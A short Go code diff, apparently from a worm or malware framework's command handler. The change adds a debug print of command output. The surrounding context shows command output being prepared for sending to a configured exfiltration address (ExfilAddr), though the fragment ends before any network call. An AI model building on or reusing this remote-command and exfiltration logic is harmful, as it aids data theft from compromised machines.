@@ -259,6 +259,9 @@ func handle_command(cmd string) {
 			if err != nil {
 				out += ": " + err.Error()
 			}
+			if strings.Contains(preamble, "d") {
+				fmt.Println(out)
+			}
 			if strings.Contains(preamble, "v") {
 				host := strings.Split(NeuraxConfig.ExfilAddr, ":")[0]
 				port := strings.Split(NeuraxConfig.ExfilAddr, ":")[1]
